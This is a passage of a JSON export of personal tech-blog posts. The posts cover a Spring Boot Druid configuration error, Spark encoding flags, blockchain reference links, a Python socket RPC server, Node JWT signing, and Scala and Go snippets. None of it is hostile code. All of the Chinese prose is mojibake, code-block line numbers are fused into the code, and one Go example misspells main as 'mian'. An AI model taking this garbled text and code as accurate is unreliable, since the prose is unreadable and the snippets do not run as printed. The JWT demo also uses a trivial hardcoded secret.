é…ç½®","slug":"history/tech/5b92430c032680355c37d965","date":"2018-09-06T21:21:16.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5b92430c032680355c37d965/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5b92430c032680355c37d965/","excerpt":"","text":"1å‡çº§Spring Bootç‰ˆæœ¬åˆ°2.0.2åæŠ¥ä¸‹é¢çš„é”™ï¼Œdruidç”¨çš„æ˜¯1.1.9123456789101112[o.s.b.w.s.c.AnnotationConfigServletWebServerApplicationContext : 99] - Exception encountered during context initialization - cancelling refresh attempt: org.springframework.context.ApplicationContextException: Unable to start web server; nested exception is java.lang.RuntimeException: org.springframework.beans.factory.BeanCreationException: Error creating bean with name &apos;servletEndpointRegistrar&apos; defined in class path resource [org/springframework/boot/actuate/autoconfigure/endpoint/web/ServletEndpointManagementContextConfiguration.class]: Bean instantiation via factory method failed;nested exception is org.springframework.beans.BeanInstantiationException: Failed to instantiate [org.springframework.boot.actuate.endpoint.web.ServletEndpointRegistrar]: Factory method &apos;servletEndpointRegistrar&apos; threw exception;nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name &apos;healthEndpoint&apos; defined in class path resource [org/springframework/boot/actuate/autoconfigure/health/HealthEndpointConfiguration.class]: Bean instantiation via factory method failed;nested exception is org.springframework.beans.BeanInstantiationException: Failed to instantiate [org.springframework.boot.actuate.health.HealthEndpoint]: Factory method &apos;healthEndpoint&apos; threw exception;nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name &apos;org.springframework.boot.actuate.autoconfigure.jdbc.DataSourceHealthIndicatorAutoConfiguration&apos;: Bean instantiation via constructor failed; nested exception is org.springframework.beans.BeanInstantiationException: Failed to instantiate [org.springframework.boot.actuate.autoconfigure.jdbc.DataSourceHealthIndicatorAutoConfiguration$$EnhancerBySpringCGLIB$$9e89c27b]: Constructor threw exception; nested exception is org.springframework.boot.context.properties.ConfigurationPropertiesBindException: Error creating bean with name &apos;dataSource&apos;: Could not bind properties to &apos;DruidDataSourceWrapper&apos; : prefix=spring.datasource.druid, ignoreInvalidFields=false, ignoreUnknownFields=true; nested exception is org.springframework.boot.context.properties.bind.BindException: Failed to bind properties under &apos;spring.datasource.druid&apos; to javax.sql.DataSourceæŸ¥çœ‹å †æ ˆä»£ç ï¼Œå®¹å™¨æ²¡æœ‰å®Œæˆåˆå§‹åŒ–ï¼Œåœ¨æŸ¥çœ‹æœ€åä¸€è¡Œå †æ ˆå‘ç° datasource æ²¡æœ‰å®ä¾‹æˆåŠŸï¼Œè·Ÿä¹‹é—´çš„è€ç‰ˆæœ¬åšäº†å¯¹æ¯”å‘ç°filters é…ç½®åŠ äº†log4 å°±å¼‚å¸¸ã€‚æŸ¥çœ‹log4Fliter ç±»ã€‚å‘ç°ç§»é™¤äº†log4 åŒ…å¯¼è‡´æ— æ³•loadæˆåŠŸ ã€‚Spring Boot é»˜è®¤çš„æ—¥å¿—ç³»ç»Ÿæ˜¯ logbackï¼Œå¹¶æ²¡æœ‰ä¾èµ– log4jï¼Œè¿™é‡Œé…ç½®çš„ log4j æ‰€ä»¥æŠ¥é”™äº†ã€‚è¦æƒ³ä½¿ç”¨ log4j filter ä½ è¦æŠŠæ—¥å¿—ç³»ç»Ÿåˆ‡æ¢ä¸º log4jã€‚123æ­£ç¡®çš„é…ç½® druid: filters: stat,wall","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"baipeng"},{"title":"spark println ä¸­æ–‡ä¹±ç ","slug":"history/tech/5b8e21c6032680355c37d964","date":"2018-09-03T18:10:14.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5b8e21c6032680355c37d964/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5b8e21c6032680355c37d964/","excerpt":"","text":"å¯åŠ¨å¢åŠ ä»¥ä¸‹å‚æ•°12--conf spark.driver.extraJavaOptions=&quot; -Dfile.encoding=utf-8 &quot; \\--conf spark.executor.extraJavaOptions=&quot; -Dfile.encoding=utf-8 &quot; \\æˆ–è€…ä½¿ç”¨ logWarning:12import org.apache.log4j.&#123;Level, LogManager, PropertyConfigurator&#125;logWarning(&quot;æˆ‘æ²¡æœ‰ä¹±ç &quot;)","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"åŒºå—é“¾æŠ€æœ¯åˆè¾‘","slug":"history/tech/5b8032f8032680355c37d963","date":"2018-08-25T04:31:52.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5b8032f8032680355c37d963/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5b8032f8032680355c37d963/","excerpt":"","text":"åŒºå—é“¾é¡¹ç›®æºç å¤§å…¨æ¯”ç‰¹å¸BTCæºç  ï¼šhttps://github.com/bitcoinä»¥å¤ªåŠETHæºç  ï¼šhttps://github.com/ethereumä»¥å¤ªç»å…¸ETCæºç  ï¼šhttps://github.com/ethereumprojectå°èšNEOæºç  ï¼šhttps://github.com/neo-projectæ ‡å‡†é“¾CZRæºç ï¼šhttps://github.com/canonchainæŸšå­EOSæºç  ï¼šhttps://github.com/eosioé‡å­é“¾QTUMæºç  ï¼šhttps://github.com/qtumprojectæ¯”åŸé“¾BTMæºç  ï¼šhttps://github.com/bytomè±ç‰¹å¸LTCæºç  ï¼šhttps://github.com/litecoin-projectå…¬ä¿¡å®GXSæºç  ï¼šhttps://github.com/ethereumprojectæ¯”ç‰¹è‚¡BTSæºç  ï¼šhttps://github.com/bitsharesADAæºç  ï¼šhttps://github.com/input-output-hkAEæºç  ï¼šhttps://github.com/aeternityELFæºç  ï¼šhttps://github.com/aelfProjectOMGæºç  ï¼šhttps://github.com/omiseSNTæºç  ï¼šhttps://github.com/status-imæ³¢åœºTRXæºç  ï¼šhttps://github.com/tronprotocolæ›´å¤šé¡¹ç›®æºç  ï¼šhttp://myhref.com/code.html0ã€åŒºå—é“¾ç»¼åˆçŸ¥è¯†0.1ç»¼åˆçŸ¥è¯†https://learnblockchain.cn/http://www.8btc.com/ å·´æ¯”ç‰¹0.2åŒºå—é“¾å¼€å‘https://blog.csdn.net/sportshark ä¸€ä¸ªæ¢è®¨åŒºå—é“¾å¼€å‘çš„ç½‘ç«™http://wangxiaoming.com/ æ±ªæ™“æ˜å¯¹åŒºå—é“¾ã€ä»¥å¤ªåŠçš„æ€è€ƒhttps://blog.csdn.net/itcastcpp å°¹æˆå­¦é™¢1ã€æ¯”ç‰¹å¸1.1æ¯”ç‰¹å¸ç™½çš®ä¹¦æ¯”ç‰¹å¸ç™½çš®ä¹¦ï¼šä¸€ç§ç‚¹å¯¹ç‚¹çš„ç”µå­ç°é‡‘ç³»ç»Ÿ1.2æ¯”ç‰¹å¸ä»£ç https://github.com/bitcoin/bitcoin1.3æ¯”ç‰¹å¸æºä»£ç å®‰è£…ç¼–è¯‘https://blog.csdn.net/Metal1/article/details/80086184 æ¯”ç‰¹å¸Bitcoinæºä»£ç å®‰è£…ç¼–è¯‘https://blog.csdn.net/taifei/article/details/73087120 VCç¼–è¯‘è°ƒè¯•æ¯”ç‰¹å¸æºç 1.4æ¯”ç‰¹å¸æºä»£ç åˆ†æhttps://blog.csdn.net/pure_lady/article/category/7131199https://blog.csdn.net/teaspring1.5æ¯”ç‰¹å¸åŒºå—æµè§ˆç½‘ç«™https://blockchain.info/zh-cn/https://btc.com/https://webbtc.com/https://insight.bitpay.com/https://blockexplorer.com/2 ä»¥å¤ªåŠ2.1ä»¥å¤ªåŠå®˜æ–¹ç½‘ç«™https://www.ethereum.org/2.2ä»¥å¤ªåŠåŸºæœ¬åŸç†https://blog.csdn.net/Metal1/article/details/80138647 ä»¥å¤ªåŠçš„å·¥ä½œåŸç†, å¹²è´§http://wiki.jikexueyuan.com/project/ethereum/ ä»¥å¤ªåŠå®˜æ–¹æ–‡æ¡£ä¸­æ–‡ç‰ˆ2.3ä»¥å¤ªåŠæºä»£ç https://github.com/ethereum2.4ä»¥å¤ªåŠä»£ç åˆ†æhttps://blog.csdn.net/omnispace/article/details/79311891 ä»¥å¤ªåŠgoè¯­è¨€ä»£ç åˆ†æhttps://blog.csdn.net/ddffr goä»£ç åˆ†æhttps://blog.csdn.net/teaspring go ä»£ç åˆ†æhttps://www.cnblogs.com/Evsward/p/miner.html æŒ–çŸ¿ä»£ç åˆ†æhttps://blog.csdn.net/ddffr/article/details/78773961 æŒ–çŸ¿ä»£ç åˆ†æhttps://blog.csdn.net/metal1/article/details/79996945 ethashç®—æ³•åˆ†æhttps://blog.csdn.net/cj2094 cj2094çš„åšå®¢ ä»¥å¤ªåŠä»£ç åˆ†æCä»£ç ä¾èµ–åº“http://zh.highscore.de/cpp/boost/ C BOOST åº“https://www.cryptopp.com/ CryptoÂ® Library 7.0https://github.com/open-source-parsers/jsoncpp JSON åº“http://jsonrpc-cpp.sourceforge.net/ JSONRPChttp://yaml.org/ YMALhttp://www.runoob.com/cplusplus/cpp-basic-syntax.html Cå…¥é—¨2.5ä»¥å¤ªåŠåŒºå—æµè§ˆhttps://ethstats.net/ è¯¥ç½‘ç«™èƒ½å…¨é¢çš„æ˜¾ç¤ºç½‘ç»œçŠ¶æ€ï¼ŒåŒ…æ‹¬èŠ‚ç‚¹ã€éš¾åº¦ã€ç®—åŠ›ç­‰ç­‰ï¼Œéå¸¸ç›´è§‚https://www.etherchain.org/http://etherscan.io/ è¯¥ç½‘ç«™æä¾›äº†ä»¥å¤ªåŠç½‘ç»œçš„å„ç§çŠ¶æ€ï¼Œæ¯”å¦‚å¸å·çš„è¯¦æƒ…ã€TOKENè¯¦æƒ…ï¼Œéš¾åº¦è¯¦æƒ…ã€åŒºå—è¯¦æƒ…ï¼Œéå¸¸æ–¹ä¾¿å’Œç›´è§‚2.6ä»¥å¤ªåŠçš„ä½¿ç”¨2.6.1 åšå®¢å›­æ–‡ç« (1):æ­å»º(Ubuntuç³»ç»Ÿ)Truffle v3.2.1 å¼€å‘å’Œæµ‹è¯•ç¯å¢ƒhttp://www.cnblogs.com/zl03jsj/p/6819333.html(2):æ­å»ºä»¥å¤ªåŠç§æœ‰é“¾,æ‰§è¡ŒæŒ–çŸ¿http://www.cnblogs.com/zl03jsj/p/6858928.html(3):åœ¨ä»¥å¤ªåŠç§æœ‰ç½‘ç»œä¸­å»ºç«‹èŠ‚ç‚¹é›†ç¾¤,å¹¶å‘ç”Ÿäº¤æ˜“.http://www.cnblogs.com/zl03jsj/p/6876064.html(4):Truffleåˆ›å»ºé¡¹ç›®,ç¼–è¯‘,åŠé¡¹ç›®éƒ¨ç½²http://www.cnblogs.com/zl03jsj/p/7012178.html2.6.2 æ­å»ºç§é“¾ä½¿ç”¨ä»¥å¤ªåŠhttps://blog.csdn.net/metal1/article/details/80139421 ã€ä»¥å¤ªåŠå‚»ç“œæ•™ç¨‹ã€‘å¦‚ä½•åˆ›å»ºç§é“¾2.6.3 getchå‘½ä»¤ä½¿ç”¨https://mp.csdn.net/postedit/80114792 getch å‘½ä»¤å¤§å…¨https://blog.csdn.net/Metal1/article/details/80614880 gethä½¿ç”¨2.6æ™ºèƒ½åˆçº¦https://blog.csdn.net/Metal1/article/details/80172718 æ™ºèƒ½åˆçº¦hello worldhttp://remix.ethereum.org/http://solidity.readthedocs.io/en/latest/ Solidityç¼–ç¨‹æ–‡æ¡£ï¼ˆå®˜æ–¹ï¼‰https://live.ether.camp/ ä»¥å¤ªåŠç¬¬ä¸‰æ–¹å¼ºå¤§çš„IDE2.7Trufflehttp://truffle.readthedocs.io/en/latest/ ä»¥å¤ªåŠå¼€å‘æ¡†æ¶Truffleè¯´æ˜ä¹¦2.8ä»¥å¤ªåŠæ–‡æ¡£http://ethdoc.cn/index.htmlhttp://www.ethdocs.org/en/latest/index.htmlhttps://blog.ethereum.org/ ä»¥å¤ªåŠå®˜æ–¹åšå®¢https://github.com/ethereum/wiki/wiki ä»¥å¤ªåŠwikiç™¾ç§‘http://ethfans.org/ ä»¥å¤ªåŠä¸­æ–‡çˆ±å¥½è€…ç½‘ç«™https://forum.ethereum.org/ ä»¥å¤ªåŠçš„å®˜æ–¹è®ºå›3ã€åŒºå—é“¾å®‰å…¨3.1 ä»¥å¤ªåŠä¸‰å¤©ç«Ÿç„¶çˆ†å‘ä¸¤èµ·å¤§æ¼æ´äº‹ä»¶ï¼æˆ‘ä»¬æ¥æ•™ä½ å¦‚ä½•è·³è¿‡ä»¥å¤ªåŠçš„å‘4 å…¶ä»–æ•°å­—è´§å¸4.1 dashhttps://github.com/dashpay æºä»£ç 4.2 æ¯”åŸé“¾https://bytom.io/ å®˜ç½‘5ã€GPUæŒ–çŸ¿https://ethereum.gitbooks.io/frontier-guide/content/gpu.html GPUæŒ–çŸ¿","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"baipeng"},{"title":"MacOS æŠ¥é”™ xcodebuild -showsdks","slug":"history/tech/5b7f7d73032680355c37d962","date":"2018-08-24T03:37:23.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5b7f7d73032680355c37d962/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5b7f7d73032680355c37d962/","excerpt":"","text":"12345mac æŠ¥é”™xcodebuild -showsdksxcode-select: error: tool &apos;xcodebuild&apos; requires Xcode, but active developer directory &apos;/Library/Developer/CommandLineTools&apos; is a command line tools instance1sudo xcode-select --switch /Applications/Xcode.app/Contents/Developer/","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"baipeng"},{"title":"scala apply æµ‹è¯•ä»£ç ","slug":"history/tech/5b7e77b6032680355c37d961","date":"2018-08-22T21:00:38.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5b7e77b6032680355c37d961/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5b7e77b6032680355c37d961/","excerpt":"","text":"1234567891011121314151617181920212223242526package org.qianrushiclass ApplyTest &#123; def apply() = println(&quot;class ApplyTest&quot;) def haveATry(): Unit =&#123; println(&quot;haveATry&quot;) &#125;&#125;object ApplyTest &#123; def apply() = &#123; println(&quot;object ApplyTest&quot;) new ApplyTest &#125;&#125;object ApplyOperation &#123; def main(args: Array[String]): Unit = &#123; val a = ApplyTest() a.haveATry a() // è§¦å‘ class ApplyTest çš„ apply æ–¹æ³• &#125;&#125;","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"node jwt ç”Ÿæˆtokenä½¿ç”¨","slug":"history/tech/5b7d0730032680355c37d960","date":"2018-08-21T18:48:16.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5b7d0730032680355c37d960/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5b7d0730032680355c37d960/","excerpt":"","text":"1npm install jsonwebtoken --save12345678910111213141516const jwt = require(&apos;jsonwebtoken&apos;);const secret = &apos;aaa&apos;; //æ’’ç›ï¼šåŠ å¯†çš„æ—¶å€™æ··æ·† //jwtç”Ÿæˆtoken const token = jwt.sign(&#123; name: 123 &#125;, secret, &#123; expiresIn: 60 //ç§’åˆ°æœŸæ—¶é—´ &#125;);console.log(token);//è§£å¯†tokenjwt.verify(token, secret, function (err, decoded) &#123; if (!err)&#123; console.log(decoded.name); //ä¼šè¾“å‡º123ï¼Œå¦‚æœè¿‡äº†60ç§’ï¼Œåˆ™æœ‰é”™è¯¯ã€‚ &#125;&#125;)","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"baipeng"},{"title":"solidity","slug":"history/tech/5b7bc997032680355c37d95f","date":"2018-08-20T20:13:11.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5b7bc997032680355c37d95f/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5b7bc997032680355c37d95f/","excerpt":"","text":"1npm i -g truffle å‡çº§truffleï¼Œä¿è¯ç‰ˆæœ¬å’Œåˆçº¦ä¸­çš„ç‰ˆæœ¬ä¸€è‡´1ç¼–è¯‘åˆçº¦ truffle compile1éƒ¨ç½²åˆçº¦ truffle migrate","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"baipeng"},{"title":"mongodb 3.2 å‡çº§ 3.4","slug":"history/tech/5b7a87dc032680355c37d95e","date":"2018-08-19T21:20:28.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5b7a87dc032680355c37d95e/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5b7a87dc032680355c37d95e/","excerpt":"","text":"http://www.mongoing.com/docs/release-notes/3.4-upgrade-replica-set.html","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"ä»¥å¤ªåŠæºç å­¦ä¹ ä¹‹æ—…  p2p","slug":"history/tech/5b76309a032680355c37d95d","date":"2018-08-17T02:19:06.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5b76309a032680355c37d95d/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5b76309a032680355c37d95d/","excerpt":"","text":"1234ä»¥å¤ªåŠçš„p2pæ¨¡å—åˆ†åˆ«ä½¿ç”¨äº†UDP å’Œ TCPä¸¤ç§é•¿è¿æ¥æ¡æ‰‹åè®®ã€‚UDP åè®®ä¸»è¦åº”ç”¨åœ¨discoveråŒ…ä¸‹ï¼Œç”¨äºnodeèŠ‚ç‚¹å‘ç°é€šä¿¡ã€‚èŠ‚ç‚¹å‘ç°ä½¿ç”¨äº† Kademlia ç®—æ³• ï¼Œå…·ä½“æ¦‚å¿µå¯ä»¥å‚è€ƒä¸‹é¢é“¾æ¥``` [Kadem](https://zh.wikipedia.org/wiki/Kademlia)TCP åè®®ç”¨æ¥nodeèŠ‚ç‚¹çš„æ¶ˆæ¯é€šä¿¡","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"baipeng"},{"title":"rpcæœåŠ¡å™¨ã€å¤šçº¿ç¨‹åŒæ­¥ã€‘æ¨¡å‹","slug":"history/tech/5b7011fb43321ba758e2bd85","date":"2018-08-11T22:54:51.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5b7011fb43321ba758e2bd85/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5b7011fb43321ba758e2bd85/","excerpt":"","text":"1å¤šçº¿ç¨‹å¤„ç† éœ€è¦å¼€å¯ä¸€ä¸ªæ–°çš„çº¿ç¨‹å»å¤„ç†RPCçš„é€šä¿¡ï¼Œæ¥ç€ä¸Š å•çº¿ç¨‹åŒæ­¥ çš„ä»£ç rpcã€å•çº¿ç¨‹åŒæ­¥ã€‘æ¨¡å‹1_thread.start_new_thread(fun,(params...))123456import _threaddef loop(s, handlers): while True: conn, addr = s.accept() _thread.start_new_thread(handle_conn, (conn, addr, handlers)) # å¤„ç†è¿æ¥)","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"baipeng"},{"title":"rpcæœåŠ¡å™¨ã€å•çº¿ç¨‹åŒæ­¥ã€‘æ¨¡å‹","slug":"history/tech/5b700fe643321ba758e2bd84","date":"2018-08-11T22:45:58.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5b700fe643321ba758e2bd84/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5b700fe643321ba758e2bd84/","excerpt":"","text":"123456789101112131415161718192021222324252627282930313233client.py å®¢æˆ·ç«¯ä»£ç # -*- coding: UTF-8 -*-import jsonimport structimport socketimport timedef rpc(sock, in_, params): request = json.dumps(&#123;&quot;in&quot;: in_, &quot;params&quot;: params&#125;) # è¯·æ±‚æ¶ˆæ¯ä½“ # print(request) length_prefix = struct.pack(&quot;I&quot;, len(request)) # è¯·æ±‚é•¿åº¦å‰ç¼€ # print(length_prefix) # request2 = struct.pack(&quot;c&quot;, request) # print(request2) sock.sendall(length_prefix) sock.sendall(request.encode()) length_prefix = sock.recv(4) # å“åº”é•¿åº¦å‰ç¼€ # print(length_prefix) length, = struct.unpack(&quot;I&quot;, length_prefix) body = sock.recv(length) # å“åº”æ¶ˆæ¯ä½“ response = json.loads(body) return response[&quot;out&quot;], response[&quot;result&quot;] # è¿”å›å“åº”ç±»å‹å’Œç»“æœ...if __name__ == &apos;__main__&apos;: s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((&quot;localhost&quot;, 8080)) for i in range(10): out, result = rpc(s, &quot;ping&quot;, &quot;ireader %d&quot; % i) print(out, result) time.sleep(1) s.close()1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253# -*- coding: UTF-8 -*-import jsonimport structimport socketimport timedef loop(s, handlers): while True: conn, addr = s.accept() handle_conn(conn, addr, handlers) # å¤„ç†è¿æ¥def handle_conn(conn, addr, handlers): print(addr, &quot;comes&quot;) while True: # å¾ªç¯è¯»å†™ length_prefix = conn.recv(4) # è¯·æ±‚é•¿åº¦å‰ç¼€ if not length_prefix: # è¿æ¥å…³é—­äº† print addr, &quot;bye&quot; conn.close() break # é€€å‡ºå¾ªç¯ï¼Œå¤„ç†ä¸‹ä¸€ä¸ªè¿æ¥ length, = struct.unpack(&quot;I&quot;, length_prefix) body = conn.recv(length).decode() # è¯·æ±‚æ¶ˆæ¯ä½“ request = json.loads(body) in_ = request[&apos;in&apos;] params = request[&apos;params&apos;] print( in_, params) handler = handlers[in_] # æŸ¥æ‰¾è¯·æ±‚å¤„ç†å™¨ handler(conn, params) # å¤„ç†è¯·æ±‚...def send_result(conn, out, result): response = json.dumps(&#123;&quot;out&quot;: out, &quot;result&quot;: result&#125;) # å“åº”æ¶ˆæ¯ä½“ length_prefix = struct.pack(&quot;I&quot;, len(response)) # å“åº”é•¿åº¦å‰ç¼€ conn.sendall(length_prefix) conn.sendall(response.encode())def ping(conn, params): send_result(conn, &quot;pong&quot;, params)if __name__ == &apos;__main__&apos;: s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # æ‰“å¼€ reuse addr é€‰é¡¹ s.bind((&quot;localhost&quot;, 8080)) s.listen(1) handlers = &#123; &quot;ping&quot;: ping &#125; loop(s, handlers)","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"baipeng"},{"title":"go sync.WaitGroupå’Œæ ‡ç­¾æ··åˆä½¿ç”¨ç»ƒä¹ ","slug":"history/tech/5b6fe82c43321ba758e2bd83","date":"2018-08-11T19:56:28.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5b6fe82c43321ba758e2bd83/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5b6fe82c43321ba758e2bd83/","excerpt":"","text":"1234567891011121314151617181920212223242526func main() &#123; var wg sync.WaitGroup wg.Add(2) // å› ä¸ºæœ‰ä¸¤ä¸ªåŠ¨ä½œï¼Œæ‰€ä»¥å¢åŠ 2ä¸ªè®¡æ•°cesi_tab: for i := 0; i &lt;= 5; i++ &#123; for j := 0; j &lt;= 5; j++ &#123; if j == 4 &#123; go func() &#123; fmt.Println(&quot;Goroutine 2&quot;) wg.Done() // æ“ä½œå®Œæˆï¼Œå‡å°‘ä¸€ä¸ªè®¡æ•° &#125;() break cesi_tab &#125; fmt.Printf(&quot;i is: %d, and j is: %d\\n&quot;, i, j) &#125; &#125; fmt.Println(&quot;ok@@@@&quot;) go func() &#123; fmt.Println(&quot;Goroutine 1&quot;) wg.Done() // æ“ä½œå®Œæˆï¼Œå‡å°‘ä¸€ä¸ªè®¡æ•° &#125;() wg.Wait() // ç­‰å¾…ï¼Œç›´åˆ°è®¡æ•°ä¸º0&#125;1234567i is: 0, and j is: 0i is: 0, and j is: 1i is: 0, and j is: 2i is: 0, and j is: 3ok@@@@Goroutine 1Goroutine 2","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"baipeng"},{"title":"go æ ‡ç­¾","slug":"history/tech/5b6fe76943321ba758e2bd82","date":"2018-08-11T19:53:13.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5b6fe76943321ba758e2bd82/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5b6fe76943321ba758e2bd82/","excerpt":"","text":"12345678910111213141516171819func mian() &#123; c := make(chan string,1) defer close(c) go func() &#123; for i := 0; i &lt; 10; i++ &#123; c &lt;- fmt.Sprint(&quot;baipeng&quot;, i) &#125; &#125;() hello: for &#123; select &#123; case s := &lt;-c: fmt.Println(s) default: break hello &#125; &#125;&#125;","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"baipeng"},{"title":"17å¹´åšçš„ä¸€ä¸ªå°ç¨‹åº  æ¯æ—¥æ•…å®«lite  å¾®ä¿¡æ‰«ä¸€æ‰«  ç‚¹ä¸ªå¹¿å‘Šåˆ·ä¸ªå• 